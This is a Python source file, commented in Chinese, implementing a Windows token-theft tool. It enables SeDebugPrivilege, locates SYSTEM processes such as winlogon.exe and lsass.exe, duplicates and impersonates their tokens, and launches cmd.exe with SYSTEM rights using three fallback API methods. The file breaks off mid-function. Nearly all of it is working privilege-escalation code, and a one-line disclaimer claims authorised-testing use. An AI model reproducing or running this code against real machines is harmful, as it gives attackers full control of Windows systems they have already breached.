#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
系统权限获取工具（令牌窃取）

注意：此工具仅用于合法的安全测试和研究目的。使用此工具必须获得适当的授权。
未经授权使用此工具可能违反法律法规。请在使用前了解相关法律责任。

此工具通过Windows API实现令牌窃取技术，允许获取具有SYSTEM权限的进程令牌，
并使用该令牌创建新的特权进程或提升当前进程的权限。
"""

import ctypes
import os
import sys
import subprocess
from ctypes import wintypes

# 定义Windows API常量
SE_DEBUG_NAME = "SeDebugPrivilege"
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_QUERY = 0x0008
TOKEN_DUPLICATE = 0x0002
TOKEN_ASSIGN_PRIMARY = 0x0001
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_READ = 0x0010
PROCESS_DUP_HANDLE = 0x0040
CREATE_NEW_CONSOLE = 0x00000010
ERROR_NO_TOKEN = 1008
ERROR_PRIVILEGE_NOT_HELD = 1314

# 定义Windows API结构
class LUID(ctypes.Structure):
    _fields_ = [
        ("LowPart", wintypes.DWORD),
        ("HighPart", wintypes.LONG),
    ]

class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("Luid", LUID),
        ("Attributes", wintypes.DWORD),
    ]

class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [
        ("PrivilegeCount", wintypes.DWORD),
        ("Privileges", LUID_AND_ATTRIBUTES * 1),
    ]

class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", ctypes.POINTER(wintypes.BYTE)),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]

# 加载Windows API库
kernel32 = ctypes.WinDLL("kernel32.dll")
advapi32 = ctypes.WinDLL("advapi32.dll")
psapi = ctypes.WinDLL("psapi.dll")

# 添加LookupAccountSidW函数定义
lookup_account_sid = advapi32.LookupAccountSidW
lookup_account_sid.argtypes = [
    wintypes.LPCWSTR,        # lpSystemName
    ctypes.c_void_p,         # lpSid
    wintypes.LPWSTR,         # lpName
    ctypes.POINTER(wintypes.DWORD),  # cchName
    wintypes.LPWSTR,         # lpReferencedDomainName
    ctypes.POINTER(wintypes.DWORD),  # cchReferencedDomainName
    ctypes.POINTER(wintypes.DWORD)   # peUse
]
lookup_account_sid.restype = wintypes.BOOL

# 定义函数原型
get_current_process = kernel32.GetCurrentProcess
get_current_process.restype = wintypes.HANDLE

open_process_token = advapi32.OpenProcessToken
open_process_token.argtypes = [wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
open_process_token.restype = wintypes.BOOL

lookup_privilege_value = advapi32.LookupPrivilegeValueW
lookup_privilege_value.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR, ctypes.POINTER(LUID)]
lookup_privilege_value.restype = wintypes.BOOL

adjust_token_privileges = advapi32.AdjustTokenPrivileges
adjust_token_privileges.argtypes = [wintypes.HANDLE, wintypes.BOOL, ctypes.POINTER(TOKEN_PRIVILEGES), wintypes.DWORD, ctypes.POINTER(TOKEN_PRIVILEGES), ctypes.POINTER(wintypes.DWORD)]
adjust_token_privileges.restype = wintypes.BOOL

open_process = kernel32.OpenProcess
open_process.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
open_process.restype = wintypes.HANDLE

duplicate_token_ex = advapi32.DuplicateTokenEx
duplicate_token_ex.argtypes = [wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.ULARGE_INTEGER), wintypes.DWORD, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
duplicate_token_ex.restype = wintypes.BOOL

create_process_as_user = advapi32.CreateProcessAsUserW
create_process_as_user.argtypes = [wintypes.HANDLE, wintypes.LPCWSTR, wintypes.LPWSTR, ctypes.POINTER(wintypes.ULARGE_INTEGER), ctypes.POINTER(wintypes.ULARGE_INTEGER), wintypes.BOOL, wintypes.DWORD, wintypes.LPCWSTR, wintypes.LPCWSTR, ctypes.POINTER(STARTUPINFO), ctypes.POINTER(PROCESS_INFORMATION)]
create_process_as_user.restype = wintypes.BOOL

# 添加CreateProcessWithTokenW函数定义（作为备选方法）
create_process_with_token = advapi32.CreateProcessWithTokenW
create_process_with_token.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.LPCWSTR, wintypes.LPWSTR, wintypes.DWORD, ctypes.POINTER(wintypes.ULARGE_INTEGER), wintypes.LPCWSTR, ctypes.POINTER(STARTUPINFO), ctypes.POINTER(PROCESS_INFORMATION)]
create_process_with_token.restype = wintypes.BOOL

# 添加ShellExecuteEx函数定义（作为第三种备选方法）
shell32 = ctypes.WinDLL("shell32.dll")

class SHELLEXECUTEINFO(ctypes.Structure):
    _fields_ = [
        ("cbSize", wintypes.DWORD),
        ("fMask", wintypes.DWORD),
        ("hwnd", wintypes.HANDLE),
        ("lpVerb", wintypes.LPCWSTR),
        ("lpFile", wintypes.LPCWSTR),
        ("lpParameters", wintypes.LPWSTR),
        ("lpDirectory", wintypes.LPCWSTR),
        ("nShow", wintypes.INT),
        ("hInstApp", wintypes.HINSTANCE),
        ("lpIDList", ctypes.c_void_p),
        ("lpClass", wintypes.LPCWSTR),
        ("hKeyClass", wintypes.HKEY),
        ("dwHotKey", wintypes.DWORD),
        ("hIcon_or_hMonitor", wintypes.HANDLE),
        ("hProcess", wintypes.HANDLE),
    ]

shell_execute_ex = shell32.ShellExecuteExW
shell_execute_ex.argtypes = [ctypes.POINTER(SHELLEXECUTEINFO)]
shell_execute_ex.restype = wintypes.BOOL

# 添加GetProcessId函数定义
get_process_id = kernel32.GetProcessId
get_process_id.argtypes = [wintypes.HANDLE]
get_process_id.restype = wintypes.DWORD

close_handle = kernel32.CloseHandle
close_handle.argtypes = [wintypes.HANDLE]
close_handle.restype = wintypes.BOOL

# 添加FormatMessageW函数定义
format_message = kernel32.FormatMessageW
format_message.argtypes = [
    wintypes.DWORD,  # dwFlags
    ctypes.c_void_p, # lpSource
    wintypes.DWORD,  # dwMessageId
    wintypes.DWORD,  # dwLanguageId
    wintypes.LPWSTR, # lpBuffer
    wintypes.DWORD,  # nSize
    ctypes.c_void_p  # Arguments
]
format_message.restype = wintypes.DWORD

get_last_error = kernel32.GetLastError
get_last_error.restype = wintypes.DWORD

get_process_image_filename = psapi.GetProcessImageFileNameW
get_process_image_filename.argtypes = [wintypes.HANDLE, wintypes.LPWSTR, wintypes.DWORD]
get_process_image_filename.restype = wintypes.DWORD

enum_processes = psapi.EnumProcesses
enum_processes.argtypes = [ctypes.POINTER(wintypes.DWORD), wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
enum_processes.restype = wintypes.BOOL

class TokenTheftTool:
    """系统权限获取工具类，实现令牌窃取功能"""
    
    def __init__(self):
        """初始化工具"""
        self.debug_privilege_enabled = False
        
    def enable_debug_privilege(self):
        """启用调试权限（增强版）"""
        try:
            # 定义TOKEN_ALL_ACCESS常量以获取最大权限
            TOKEN_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFF
            
            # 尝试打开当前进程的令牌
            token_handle = wintypes.HANDLE()
            
            # 首先尝试使用TOKEN_ALL_ACCESS
            if not open_process_token(get_current_process(), TOKEN_ALL_ACCESS, ctypes.byref(token_handle)):
                # 如果失败，回退到基础权限
                if not open_process_token(get_current_process(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ctypes.byref(token_handle)):
                    error_code = get_last_error()
                    error_msg = self._get_error_message(error_code)
                    raise Exception(f"无法打开进程令牌: 错误码 {error_code} - {error_msg}")
            
            # 查找调试权限的LUID
            luid = LUID()
            if not lookup_privilege_value(None, SE_DEBUG_NAME, ctypes.byref(luid)):
                close_handle(token_handle)
                error_code = get_last_error()
                error_msg = self._get_error_message(error_code)
                raise Exception(f"无法查找权限值: 错误码 {error_code} - {error_msg}")
            
            # 设置权限
            token_privileges = TOKEN_PRIVILEGES()
            token_privileges.PrivilegeCount = 1
            token_privileges.Privileges[0].Luid = luid
            token_privileges.Privileges[0].Attributes = 2  # SE_PRIVILEGE_ENABLED
            
            # 调整令牌权限
            if not adjust_token_privileges(token_handle, False, ctypes.byref(token_privileges), 0, None, None):
                close_handle(token_handle)
                error_code = get_last_error()
                error_msg = self._get_error_message(error_code)
                
                # 特殊处理ERROR_PRIVILEGE_NOT_HELD错误
                if error_code == ERROR_PRIVILEGE_NOT_HELD:
                    raise Exception(f"当前用户没有权限启用SeDebugPrivilege: 错误码 {error_code} - {error_msg}\n请确认您是以管理员身份运行此程序")
                
                raise Exception(f"无法调整令牌权限: 错误码 {error_code} - {error_msg}")
            
            # 验证权限是否真正启用
            # 重新打开令牌以验证
            verify_token_handle = wintypes.HANDLE()
            if not open_process_token(get_current_process(), TOKEN_QUERY, ctypes.byref(verify_token_handle)):
                # 验证失败，但继续执行，因为可能只是无法验证而不是权限未启用
                print("警告: 无法打开令牌进行权限验证")
            else:
                # 查询权限状态
                verify_privileges = TOKEN_PRIVILEGES()
                verify_privileges.PrivilegeCount = 1
                verify_privileges.Privileges[0].Luid = luid
                
                return_length = wintypes.DWORD()
                if adjust_token_privileges(verify_token_handle, False, None, 0, ctypes.byref(verify_privileges), ctypes.byref(return_length)):
                    is_enabled = (verify_privileges.Privileges[0].Attributes & 0x00000002) != 0
                    if is_enabled:
                        print("确认: SeDebugPrivilege权限已成功启用")
                    else:
                        print("警告: 权限调整成功，但SeDebugPrivilege似乎未启用")
                
                close_handle(verify_token_handle)
            
            close_handle(token_handle)
            self.debug_privilege_enabled = True
            return True
        except Exception as e:
            print(f"启用调试权限失败: {str(e)}")
            return False
    
    def find_system_process(self):
        """查找具有SYSTEM权限的进程"""
        # 要查找的系统进程名列表
        system_process_names = ["winlogon.exe", "lsass.exe", "services.exe", "csrss.exe"]
        
        # 枚举所有进程
        process_ids = (wintypes.DWORD * 1024)()
        bytes_returned = wintypes.DWORD()
        
        if not enum_processes(process_ids, ctypes.sizeof(process_ids), ctypes.byref(bytes_returned)):
            raise Exception(f"枚举进程失败: 错误码 {get_last_error()}")
        
        # 计算实际枚举的进程数
        process_count = bytes_returned.value // ctypes.sizeof(wintypes.DWORD)
        
        # 遍历进程，查找目标系统进程
        for i in range(process_count):
            process_id = process_ids[i]
            
            # 打开进程
            process_handle = open_process(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE, False, process_id)
            if not process_handle:
                continue
            
            # 获取进程文件名
            image_filename = ctypes.create_unicode_buffer(260)
            if get_process_image_filename(process_handle, image_filename, ctypes.sizeof(image_filename)) > 0:
                # 提取文件名（不包含路径）
                filename = os.path.basename(image_filename.value).lower()
                
                # 检查是否为目标系统进程
                if filename in system_process_names:
                    return process_handle
            
            close_handle(process_handle)
        
        return None
    
    def get_token_user_name(self, token_handle):
        """获取令牌所属的用户名"""
        try:
            # 定义TOKEN_USER结构体
            class SID_AND_ATTRIBUTES(ctypes.Structure):
                _fields_ = [
                    ("Sid", ctypes.c_void_p),
                    ("Attributes", wintypes.DWORD),
                ]
            
            class TOKEN_USER(ctypes.Structure):
                _fields_ = [
                    ("User", SID_AND_ATTRIBUTES),
                ]
            
            # 获取令牌用户信息的大小
            token_information_length = wintypes.DWORD()
            if not advapi32.GetTokenInformation(token_handle, 1, None, 0, ctypes.byref(token_information_length)):
                error_code = get_last_error()
                if error_code != 122:  # ERROR_INSUFFICIENT_BUFFER
                    print(f"    错误: GetTokenInformation(获取大小)失败，错误码: {error_code}")
                    return "未知"
            
            # 分配内存并获取令牌用户信息
            token_information = ctypes.create_string_buffer(token_information_length.value)
            if not advapi32.GetTokenInformation(token_handle, 1, token_information, token_information_length, ctypes.byref(token_information_length)):
                error_code = get_last_error()
                print(f"    错误: GetTokenInformation(获取数据)失败，错误码: {error_code}")
                return "未知"
            
            # 解析SID
            token_user = TOKEN_USER.from_buffer(token_information)
            
            # 获取账户名和域名 - 增加缓冲区大小提高成功率
            name_buffer_size = wintypes.DWORD(1024)
            domain_buffer_size = wintypes.DWORD(1024)
            name_buffer = ctypes.create_unicode_buffer(name_buffer_size.value)
            domain_buffer = ctypes.create_unicode_buffer(domain_buffer_size.value)
            sid_name_use = wintypes.DWORD()
            
            # 尝试多次获取账户信息，增加成功几率
            for attempt in range(3):
                # 先尝试直接获取足够大的缓冲区，避免多次调整
                if attempt == 0:
                    name_buffer_size.value = 4096  # 直接使用大缓冲区
                    domain_buffer_size.value = 4096
                    name_buffer = ctypes.create_unicode_buffer(name_buffer_size.value)
                    domain_buffer = ctypes.create_unicode_buffer(domain_buffer_size.value)
                    
                if lookup_account_sid(None, token_user.User.Sid, name_buffer, ctypes.byref(name_buffer_size), 
                                          domain_buffer, ctypes.byref(domain_buffer_size), ctypes.byref(sid_name_use)):
                    full_name = f"{domain_buffer.value}\\{name_buffer.value}"
                    # 特别处理SYSTEM账户
                    if "SYSTEM" in full_name.upper():
                        return "NT AUTHORITY\\SYSTEM"  # 标准SYSTEM账户名称
                    return full_name
                else:
                    error_code = get_last_error()
                    if error_code != 122:  # ERROR_INSUFFICIENT_BUFFER
                        print(f"    错误: LookupAccountSidW失败(尝试{attempt+1})，错误码: {error_code}")
                        break
                    # 如果是缓冲区不足，重新分配更大的缓冲区
                    name_buffer_size.value *= 2
                    domain_buffer_size.value *= 2
                    name_buffer = ctypes.create_unicode_buffer(name_buffer_size.value)
                    domain_buffer = ctypes.create_unicode_buffer(domain_buffer_size.value)
            
            return "未知"
        except Exception as e:
            print(f"    异常: 获取用户名时发生错误 - {str(e)}")
            return "未知"
            
    def check_token_privileges(self, token_handle):
        """检查令牌的权限信息"""
        try:
            # 定义常量
            TOKEN_QUERY = 0x0008
            
            # 打开令牌进行查询
            query_token = wintypes.HANDLE()
            if not duplicate_token_ex(token_handle, TOKEN_QUERY, None, 2, 2, ctypes.byref(query_token)):  # SecurityImpersonation, TokenImpersonation
                return False
            
            # 获取令牌权限信息的大小
            token_information_length = wintypes.DWORD()
            if not advapi32.GetTokenInformation(query_token, 3, None, 0, ctypes.byref(token_information_length)):  # TokenPrivileges
                if get_last_error() != 122:  # ERROR_INSUFFICIENT_BUFFER
                    close_handle(query_token)
                    return False
            
            # 分配内存并获取令牌权限信息
            token_information = ctypes.create_string_buffer(token_information_length.value)
            if not advapi32.GetTokenInformation(query_token, 3, token_information, token_information_length, ctypes.byref(token_information_length)):
                close_handle(query_token)
                return False
            
            # 显示令牌用户名
            user_name = self.get_token_user_name(query_token)
            print(f"令牌用户: {user_name}")
            
            # 关闭查询令牌
            close_handle(query_token)
            return True
        except:
            return False
            
    def verify_process_privileges(self, process_id):
        """验证指定进程ID的进程是否真的具有SYSTEM权限（增强诊断版）"""
        try:
            print(f"    正在验证进程 {process_id} 的权限...")
            
            # 定义打开进程所需的访问权限
            PROCESS_QUERY_LIMITED_INFORMATION = 0x00001000
            PROCESS_QUERY_INFORMATION = 0x0400
            PROCESS_ALL_ACCESS = 0x001F0FFF
            
            # 尝试使用不同的访问权限打开进程
            process_handle = open_process(PROCESS_QUERY_LIMITED_INFORMATION, False, process_id)
            if not process_handle:
                # 如果失败，尝试使用更高级的访问权限
                process_handle = open_process(PROCESS_QUERY_INFORMATION, False, process_id)
                if not process_handle:
                    # 最后尝试使用最大访问权限
                    process_handle = open_process(PROCESS_ALL_ACCESS, False, process_id)
                    if not process_handle:
                        error_code = get_last_error()
                        error_msg = self._get_error_message(error_code)
                        print(f"    无法打开进程 {process_id} 以检查权限 - 错误码 {error_code}: {error_msg}")
                        print(f"    提示: 这可能是由于安全限制或进程已结束")
                        return False
                    else:
                        print(f"    警告: 使用最高权限打开进程 {process_id}")
            
            # 打开进程的令牌
            token_handle = wintypes.HANDLE()
            TOKEN_QUERY = 0x0008
            if not open_process_token(process_handle, TOKEN_QUERY, ctypes.byref(token_handle)):
                error_code = get_last_error()
                error_msg = self._get_error_message(error_code)
                close_handle(process_handle)
                print(f"    无法打开进程 {process_id} 的令牌 - 错误码 {error_code}: {error_msg}")
                print(f"    提示: 可能需要更高的访问权限或令牌已损坏")
                return False
            
            # 检查令牌的用户名是否为SYSTEM
            user_name = self.get_token_user_name(token_handle)
            
            # 添加额外的特权检查
            is_system = "SYSTEM" in user_name.upper()
            
            # 如果无法获取用户名，尝试使用其他方法判断
            if user_name == "未知":
                print(f"    警告: 无法获取进程 {process_id} 的用户名，尝试其他方法验证权限")
                # 尝试检查令牌是否具有特定的SYSTEM特权
                is_system = self._check_token_has_system_privileges(token_handle)
            
            # 关闭句柄
            close_handle(token_handle)
            close_handle(process_handle)
            
            # 判断是否为SYSTEM权限
            if is_system:
                print(f"    确认: 进程 {process_id} 确实具有 {user_name if user_name != '未知' else 'SYSTEM'} 权限")
            else:
                print(f"    发现: 进程 {process_id} 具有 {user_name} 权限，而不是SYSTEM权限")
                print(f"    提示: 这可能是由于UAC限制、会话隔离或安全策略导致的")
                
            return is_system
        except Exception as e:
            print(f"    验证进程权限时发生错误: {str(e)}")
            return False
            
    def _check_token_has_system_privileges(self, token_handle):
        """通过检查令牌的特权来判断是否可能是SYSTEM权限的辅助方法"""
        try:
            # 定义需要查询的特权
            system_privileges = [
                "SeLoadDriverPrivilege",        # 加载驱动程序权限
                "SeTakeOwnershipPrivilege",     # 获取所有权权限
                "SeBackupPrivilege",           # 备份权限
                "SeRestorePrivilege",          # 还原权限
                "SeDebugPrivilege",            # 调试权限
                "SeSystemEnvironmentPrivilege"  # 修改系统环境权限
            ]
            
            # 定义常量
            TOKEN_QUERY = 0x0008
            SE_PRIVILEGE_ENABLED = 0x00000002
            
            # 打开令牌进行查询（如果传入的令牌权限不足）
            query_token = wintypes.HANDLE()
            if not duplicate_token_ex(token_handle, TOKEN_QUERY, None, 2, 2, ctypes.byref(query_token)):  # SecurityImpersonation, TokenImpersonation
                print("    无法复制令牌进行特权检查")
                return False
            
            # 获取令牌特权信息
            token_information_length = wintypes.DWORD()
            if not advapi32.GetTokenInformation(query_token, 3, None, 0, ctypes.byref(token_information_length)):  # TokenPrivileges
                if get_last_error() != 122:  # ERROR_INSUFFICIENT_BUFFER
                    close_handle(query_token)
                    print("    无法获取令牌特权信息大小")
                    return False
            
            # 分配内存并获取令牌特权信息
            token_information = ctypes.create_string_buffer(token_information_length.value)
            if not advapi32.GetTokenInformation(query_token, 3, token_information, token_information_length, ctypes.byref(token_information_length)):
                close_handle(query_token)
                print("    无法获取令牌特权信息")
                return False
            
            # 解析令牌特权信息
            token_privileges = ctypes.cast(token_information, ctypes.POINTER(TOKEN_PRIVILEGES)).contents
            
            # 检查是否包含多个高权限特权
            found_privileges = 0
            for i in range(token_privileges.PrivilegeCount):
                # 获取特权的LUID
                luid = token_privileges.Privileges[i].Luid
                
                # 查找特权名称
                name_buffer_size = wintypes.DWORD(256)
                name_buffer = ctypes.create_unicode_buffer(name_buffer_size.value)
                if advapi32.LookupPrivilegeNameW(None, ctypes.byref(luid), name_buffer, ctypes.byref(name_buffer_size)):
                    privilege_name = name_buffer.value
                    
                    # 检查是否为系统特权且已启用
                    if privilege_name in system_privileges and \
                       (token_privileges.Privileges[i].Attributes & SE_PRIVILEGE_ENABLED):
                        print(f"    发现已启用的高权限特权: {privilege_name}")
                        found_privileges += 1
            
            # 关闭查询令牌
            close_handle(query_token)
            
            # 如果发现多个高权限特权，很可能是SYSTEM权限
            is_likely_system = found_privileges >= 2
            if is_likely_system:
                print(f"    根据特权判断: 进程很可能具有SYSTEM权限 (发现{found_privileges}个高权限特权)")
            else:
                print(f"    根据特权判断: 进程不太可能具有完整的SYSTEM权限 (仅发现{found_privileges}个高权限特权)")
            
            return is_likely_system
        except Exception as e:
            print(f"    检查令牌特权时发生错误: {str(e)}")
            return False
              
    def impersonate_token(self, token_handle):
        """尝试模拟提供的令牌，以便在后续操作中使用该令牌的权限"""
        try:
            # 获取当前线程句柄
            current_thread = kernel32.GetCurrentThread()
            if not current_thread:
                print("    无法获取当前线程句柄")
                return False
            
            # 定义ImpersonateLoggedOnUser函数
            impersonate_logged_on_user = advapi32.ImpersonateLoggedOnUser
            impersonate_logged_on_user.argtypes = [wintypes.HANDLE]
            impersonate_logged_on_user.restype = wintypes.BOOL
            
            # 尝试模拟令牌
            if not impersonate_logged_on_user(token_handle):
                error_code = get_last_error()
                error_msg = self._get_error_message(error_code)
                print(f"    模拟令牌失败: 错误码 {error_code} - {error_msg}")
                return False
            
            # 验证模拟是否成功
            # 打开当前线程令牌并检查用户名
            thread_token = wintypes.HANDLE()
            if open_process_token(current_thread, TOKEN_QUERY, ctypes.byref(thread_token)):
                user_name = self.get_token_user_name(thread_token)
                close_handle(thread_token)
                print(f"    当前线程已模拟为: {user_name}")
            
            return True
        except Exception as e:
            print(f"    模拟令牌时发生异常: {str(e)}")
            return False
    
    def steal_token(self, target_process_handle):
        """从目标进程窃取令牌（增强诊断版）"""
        try:
            # 定义必要的访问权限常量
            TOKEN_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFF
            
            # 打开目标进程的令牌 - 请求更高的访问权限
            token_handle = wintypes.HANDLE()
            if not open_process_token(target_process_handle, TOKEN_ALL_ACCESS, ctypes.byref(token_handle)):
                # 如果请求全部访问权限失败，尝试使用基础权限
                if not open_process_token(target_process_handle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, ctypes.byref(token_handle)):
                    error_code = get_last_error()
                    error_msg = self._get_error_message(error_code)
                    raise Exception(f"无法打开目标进程令牌: 错误码 {error_code} - {error_msg}")
            
            # 复制令牌 - 使用多种安全级别尝试
            # 定义安全级别常量
            SecurityAnonymous = 0
            SecurityIdentification = 1
            SecurityImpersonation = 2
            SecurityDelegation = 3
            
            # 定义令牌类型常量
            TokenPrimary = 1
            TokenImpersonation = 2
            
            duplicate_token = wintypes.HANDLE()
            
            # 尝试使用不同的安全级别和令牌类型组合
            security_levels = [(SecurityDelegation, TokenPrimary, "SecurityDelegation + TokenPrimary"),
                              (SecurityImpersonation, TokenPrimary, "SecurityImpersonation + TokenPrimary"),
                              (SecurityImpersonation, TokenImpersonation, "SecurityImpersonation + TokenImpersonation")]
            
            success = False
            for level, token_type, description in security_levels:
                print(f"尝试使用 {description} 复制令牌...")
                if duplicate_token_ex(token_handle, 0, None, level, token_type, ctypes.byref(duplicate_token)):
                    success = True
                    print(f"成功: 使用 {description} 复制令牌")
                    break
                
                error_code = get_last_error()
                print(f"失败: 错误码 {error_code} - {self._get_error_message(error_code)}")
                
                # 如果不是最后一种尝试，重置duplicate_token
                if description != security_levels[-1][2]:
                    duplicate_token = wintypes.HANDLE()
            
            if not success:
                close_handle(token_handle)
                raise Exception("所有令牌复制尝试均失败")
            
            # 验证令牌是否有效
            if duplicate_token == 0:
                close_handle(token_handle)
                raise Exception("复制的令牌无效")
            
            print(f"成功复制令牌，句柄值: {duplicate_token}")
            
            # 检查并显示令牌信息
            print("\n正在检查令牌信息...")
            self.check_token_privileges(duplicate_token)
            
            # 检查令牌是否真的具有SYSTEM权限
            user_name = self.get_token_user_name(duplicate_token)
            if "SYSTEM" not in user_name.upper():
                print(f"警告: 获取的令牌似乎不是SYSTEM权限，而是: {user_name}")
            else:
                print(f"确认: 已成功获取 {user_name} 权限令牌")
            
            close_handle(token_handle)
            return duplicate_token
        except Exception as e:
            print(f"窃取令牌失败: {str(e)}")
            return None
    
    def create_system_process(self, token_handle, command="cmd.exe"):
        """使用窃取的令牌创建新进程（带三种备选方法的增强版）"""
        try:
            # 验证输入参数
            if not token_handle or token_handle == 0:
                raise ValueError("无效的令牌句柄")
            
            if not command:
                raise ValueError("命令不能为空")
            
            # 初始化STARTUPINFO结构体
            startup_info = STARTUPINFO()
            startup_info.cb = ctypes.sizeof(STARTUPINFO)
            
            # 设置基本窗口属性
            startup_info.dwFlags = 0x00000001  # STARTF_USESHOWWINDOW
            startup_info.wShowWindow = 1       # SW_SHOWNORMAL
            
            # 初始化PROCESS_INFORMATION结构体
            process_info = PROCESS_INFORMATION()
            
            # 准备命令行参数 - 确保命令行参数是可变的
            cmd_line = ctypes.create_unicode_buffer(command)
            
            # 提取命令和参数
            cmd_parts = command.split(" ", 1)
            if len(cmd_parts) > 1:
                cmd_file = cmd_parts[0]
                cmd_params = cmd_parts[1]
            else:
                cmd_file = command
                cmd_params = None
            
            # 方法1: 首先尝试使用CreateProcessAsUser函数
            print("尝试方法1: 使用CreateProcessAsUser创建进程...")
            success = create_process_as_user(
                token_handle,           # 令牌句柄
                None,                   # 应用程序名称
                cmd_line,               # 命令行
                None,                   # 进程安全属性
                None,                   # 线程安全属性
                False,                  # 是否继承句柄
                CREATE_NEW_CONSOLE,     # 创建标志
                None,                   # 环境变量
                None,                   # 当前目录
                ctypes.byref(startup_info),  # 启动信息
                ctypes.byref(process_info)   # 进程信息
            )
            
            if success:
                # 记录创建的进程信息
                print(f"\n已成功创建具有SYSTEM权限的进程:")
                print(f"  命令: {command}")
                print(f"  进程ID: {process_info.dwProcessId}")
                print(f"  线程ID: {process_info.dwThreadId}")
                
                # 关闭进程和线程句柄
                if process_info.hProcess:
                    close_handle(process_info.hProcess)
                if process_info.hThread:
                    close_handle(process_info.hThread)
                
                return True
            else:
                error_code = get_last_error()
                error_msg = self._get_error_message(error_code)
                print(f"方法1失败: 错误码 {error_code} - {error_msg}")
            
            # 方法2: 如果方法1失败，尝试使用CreateProcessWithTokenW函数
            print("\n尝试方法2: 使用CreateProcessWithTokenW创建进程...")
            
            # 定义登录标志
            LOGON_WITH_PROFILE = 0x00000001
            
            # 重置进程信息结构体
            process_info = PROCESS_INFORMATION()
            
            # 调用CreateProcessWithTokenW函数
            success = create_process_with_token(
                token_handle,           # 令牌句柄
                LOGON_WITH_PROFILE,     # 登录标志
                None,                   # 应用程序名称
                cmd_line,               # 命令行
                CREATE_NEW_CONSOLE,     # 创建标志
                None,                   # 环境变量
                None,                   # 当前目录
                ctypes.byref(startup_info),  # 启动信息
                ctypes.byref(process_info)   # 进程信息
            )
            
            if success:
                # 记录创建的进程信息
                print(f"\n已成功创建具有SYSTEM权限的进程:")
                print(f"  命令: {command}")
                print(f"  进程ID: {process_info.dwProcessId}")
                print(f"  线程ID: {process_info.dwThreadId}")
                
                # 关闭进程和线程句柄
                if process_info.hProcess:
                    close_handle(process_info.hProcess)
                if process_info.hThread:
                    close_handle(process_info.hThread)
                
                return True
            else:
                error_code = get_last_error()
                error_msg = self._get_error_message(error_code)
                print(f"方法2失败: 错误码 {error_code} - {error_msg}")
            
            # 方法3: 如果前两种方法都失败，尝试使用ShellExecuteExW函数
            print("\n尝试方法3: 使用ShellExecuteExW创建进程...")
            
            # 尝试先模拟令牌，这可能有助于ShellExecuteExW使用正确的权限
            impersonated = False
            thread_handle = wintypes.HANDLE()
            if token_handle:
                impersonated = self.impersonate_token(token_handle)
                if impersonated:
                    print("    成功模拟SYSTEM令牌，现在尝试创建进程...")
            
            # 定义ShellExecuteEx需要的常量
            SEE_MASK_NOCLOSEPROCESS = 0x00000040
            SEE_MASK_FLAG_NO_UI = 0x00000400
            SW_SHOW = 5
            
            # 初始化SHELLEXECUTEINFO结构体
            sei = SHELLEXECUTEINFO()
            sei.cbSize = ctypes.sizeof(SHELLEXECUTEINFO)
            sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI
            sei.hwnd = None
            sei.lpVerb = None  # 不使用runas动词，避免触发UAC
            sei.lpFile = cmd_file
            sei.lpParameters = cmd_params if cmd_params else None
            sei.lpDirectory = None
            sei.nShow = SW_SHOW
            sei.hInstApp = None
            
            # 尝试设置令牌，以便使用窃取的令牌
            # 在ShellExecuteEx中，我们不能直接设置令牌，但可以通过当前线程的模拟来影响它
            if token_handle:
                print("    提示: ShellExecuteExW无法直接使用提供的令牌，将使用当前进程的安全上下文")
            
            # 调用ShellExecuteExW函数
            success = shell_execute_ex(ctypes.byref(sei))
            
            if success:
                # 记录创建的进程信息
                print(f"\n已成功创建具有SYSTEM权限的进程:")
                print(f"  命令: {command}")
                
                # 获取进程ID
                if sei.hProcess:
                    process_id = get_process_id(sei.hProcess)
                    if process_id != 0:
                        print(f"  进程ID: {process_id}")
                    
                    # 关闭进程句柄
                    close_handle(sei.hProcess)
                
                # 如果之前模拟了令牌，现在恢复原身份
                if impersonated:
                    revert_to_self = advapi32.RevertToSelf
                    revert_to_self.restype = wintypes.BOOL
                    if revert_to_self():
                        print("    已恢复到原用户身份")
                    else:
                        print("    恢复原用户身份失败")
                
                # 验证创建的进程是否真的具有SYSTEM权限
                if process_id != 0:
                    is_system = self.verify_process_privileges(process_id)
                    if not is_system:
                        print("警告: 创建的进程似乎不具有完整的SYSTEM权限，而是普通管理员权限。")
                        print("提示: 这可能是由于UAC或其他安全机制的限制。")
                        
                return True
            else:
                error_code = get_last_error()
                error_msg = self._get_error_message(error_code)
                raise Exception(f"方法3也失败: 错误码 {error_code} - {error_msg}")
            
        except Exception as e:
